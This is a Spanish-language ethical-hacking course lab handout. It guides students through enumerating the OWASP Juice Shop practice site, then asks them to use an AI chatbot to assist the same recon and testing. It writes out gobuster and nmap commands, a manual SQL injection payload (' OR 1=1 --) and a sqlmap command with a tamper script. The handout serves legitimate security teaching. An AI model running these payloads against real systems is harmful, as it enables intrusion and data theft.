
# Laboratorio Semana 5 – Enumeración Avanzada sobre OWASP Juice Shop (Online) - (CY-203 Hackeo Ético)


**Curso**: CY-203 Hackeo Ético  
**Semana**: 5  
**Duración**: 45 min  
**Objetivo general**: Aplicar técnicas de enumeración contra el entorno vulnerable público de OWASP Juice Shop, reconociendo rutas, servicios y posibles puntos de ataque.

---

## Objetivos específicos

1. Comprender la enumeración como subfase del escaneo en un entorno real expuesto en Internet.
2. Utilizar herramientas de enumeración contra un sitio web legítimo de práctica.
3. Identificar rutas sensibles y patrones de respuesta HTTP.
4. Analizar la posibilidad de vulnerabilidades como inyección SQL a partir de la información recolectada.

---

## Conceptos clave

| Término | Definición |
|--------|------------|
| **Enumeración** | Proceso de obtención de información detallada de un objetivo usando técnicas de escaneo inteligente y peticiones controladas. |
| **HTTP** | Protocolo de transferencia de hipertexto. Permite la comunicación entre navegador y servidor web. |
| **DNS** | Sistema de Nombres de Dominio, traduce nombres como `herokuapp.com` a direcciones IP. |
| **SQLi (SQL Injection)** | Técnica para insertar comandos SQL maliciosos en formularios o URLs que no filtran correctamente la entrada. |
| **Gobuster** | Herramienta que fuerza rutas en un servidor web usando diccionarios (wordlists). |

---

## Herramientas necesarias (en Kali)

- `curl`, `nmap`, `gobuster`, `dirb`, `sqlmap`
- `wireshark` (opcional para observar tráfico local)
- Navegador Firefox o Chromium
- Wordlist: `/usr/share/wordlists/dirb/common.txt`

---

## Desarrollo del Laboratorio

### 1. Verificar accesibilidad del sitio

```bash
curl -I https://juice-shop.herokuapp.com
```

**Salida esperada**:

```
HTTP/2 200
content-type: text/html; charset=utf-8
```

---

### 2. Escaneo de puertos web (limitado por políticas éticas y técnicas)

```bash
nmap -Pn -p 443 juice-shop.herokuapp.com
```

**Salida esperada**:

```
443/tcp open  https
```

---

### 3. Enumeración de rutas con `gobuster`

```bash
gobuster dir -u https://juice-shop.herokuapp.com -w /usr/share/wordlists/dirb/common.txt -k
```

**Salida esperada**:

```
/rest (Status: 200)
/ftp (Status: 403)
/admin (Status: 200)
```

---

### 4. Exploración de rutas REST manualmente

```bash
curl https://juice-shop.herokuapp.com/rest/products/search?q=apple
```

**Salida esperada**: JSON con productos.

---

### 5. Prueba de inyección SQL manual

```bash
curl "https://juice-shop.herokuapp.com/rest/products/search?q=' OR 1=1 --"
```

**Salida esperada**: JSON con múltiples productos.

---

### 6. Uso de sqlmap (opcional y ético)

```bash
sqlmap -u "https://juice-shop.herokuapp.com/rest/products/search?q=test" --level=2 --risk=1 --batch --tamper=space2comment
```

**Salida esperada**:

```
[INFO] the back-end DBMS is SQLite
[INFO] the parameter 'q' appears to be injectable
```

---

## Reglas éticas

- Solo usar sitios **autorizados para pentesting**, como Juice Shop.
- No lanzar escaneos masivos.
- Documentar y no comprometer disponibilidad del entorno.

---

## Entregables

1. Capturas de:
   - `curl` con SQLi
   - Resultado de `gobuster`
   - Comprobación HTTP inicial
2. Resumen con rutas, parámetros vulnerables y riesgos.
3. Reflexión final:
   - ¿Por qué es peligrosa una entrada como `' OR 1=1 --`?
   - ¿Cómo se puede prevenir desde el lado del servidor?

---
---

# Laboratorio Semana 5.1 – Pentesting Asistido por Kali GPT (ChatGPT Público)

**Curso:** CY‑203 Hackeo Ético  
**Semana:** 5.1  
**Duración:** 45 min  
**Objetivo general:** Usar el agente gratuito [Kali GPT en ChatGPT](https://chatgpt.com/g/g-uRhIB5ire-kali-gpt) para asistir en tareas de enumeración, escaneo y pruebas de seguridad web sobre OWASP Juice Shop - (CY-203 Hackeo Ético)

---

## Objetivos específicos

1. Ejecutar cada fase del pentesting con apoyo de IA.  
2. Aprender a documentar y ajustar resultados con el agente de IA.  
3. Utilizar el prompt estándar para guiar el análisis.  
4. Reflexionar sobre cómo la IA mejora, guía o limita una estrategia ética.

---

##  Herramienta usada: Kali GPT (OpenAI ChatGPT)

**Acceso gratuito:**  
 [https://chatgpt.com/g/g-uRhIB5ire-kali-gpt](https://chatgpt.com/g/g-uRhIB5ire-kali-gpt)

**Prompt estándar a usar:**

```
Let's do a guide for the following web site: https://juice-shop.herokuapp.com

The guide should consist of the following parts:
1- Target Recon & Intelligence Gathering
2 - Vulnerability Scanning
3- Web Application Security

Enumerate each step so that I can paste the results and you can re-structure the strategy for better results
```

---

## Guía del laboratorio con IA

### 1. Target Recon & Intelligence Gathering

**Manual:**
```bash
whois juice-shop.herokuapp.com
curl -I https://juice-shop.herokuapp.com
```

**Con IA:**
- Preguntar al agente qué herramientas usar para hacer reconocimiento pasivo.
- Copiar resultados de `whois` y pedir análisis del registrante, DNS, etc.
- Pedir interpretación de headers HTTP.

---

### 2. Vulnerability Scanning

**Manual:**
```bash
nmap -Pn -p 443 juice-shop.herokuapp.com
gobuster dir -u https://juice-shop.herokuapp.com -w /usr/share/wordlists/dirb/common.txt -k
```

**Con IA:**
- Preguntar: "What ports should I scan on a Heroku-hosted app?"
- Pedir análisis de rutas descubiertas por `gobuster`.
- Preguntar si `/rest` o `/admin` pueden ser interesantes.

---

### 3. Web Application Security (SQLi)

**Manual:**
```bash
curl "https://juice-shop.herokuapp.com/rest/products/search?q=' OR 1=1 --"
```

**Con IA:**
- Preguntar: "What are common injection points in Juice Shop?"
- Solicitar análisis del parámetro `q` y sugerencia de payloads SQLi.
- Pedir explicación sobre la respuesta JSON para confirmar vulnerabilidad.

---

## Entregables

1. Capturas de pantalla de conversación con Kali GPT  
2. Comparación entre ejecución manual y sugerida  
3. Informe con:
   - Fases de ataque
   - Herramientas usadas
   - Resultados interpretados por la IA  
4. Reflexión:
   - ¿Te ayudó a entender mejor los pasos?
   - ¿Detectó la IA algo que no habías considerado?
   - ¿Qué pasos requieren validación humana?

---

## Conclusión

Kali GPT acelera tareas, guía estrategias y educa con ejemplos claros. Sin embargo, el pentester debe confirmar, validar y decidir qué acciones ejecutar. La IA no reemplaza la responsabilidad profesional.

---

**Profesor:** Esteban Mata Morales  
**Curso:** CY-203 Hackeo Ético  
**Universidad Fidélitas de Costa Rica**
